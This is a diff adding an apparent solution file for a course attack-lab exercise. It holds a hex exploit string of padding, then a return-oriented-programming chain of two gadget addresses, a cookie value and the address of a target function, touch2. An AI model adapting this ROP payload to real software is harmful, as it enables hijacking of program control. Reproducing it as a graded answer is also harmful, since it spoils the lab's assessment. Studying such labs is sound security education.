@@ -1,0 +1,18 @@
+/* This is the normal string: "Hi, I'm a bad guy. I want to run touch2." */
+48 69 2c 20 49 27 6d 20 
+61 20 62 61 64 20 67 75 
+79 2e 20 49 20 77 61 6e 
+74 20 74 6f 20 72 75 6e 
+20 74 6f 75 63 68 32 2e
+
+/* first gadget */
+cc 19 40 00 00 00 00 00  /* 58 90 c3: popq %rax;  ret */
+
+/* Here is the cookie */
+fa 97 b9 59 00 00 00 00
+
+/* second gadget */
+a2 19 40 00 00 00 00 00  /* 48 89 c7 c3: mov %rax, %rdi; ret */
+
+/* address of touch2 */
+ec 17 40 00 00 00 00 00
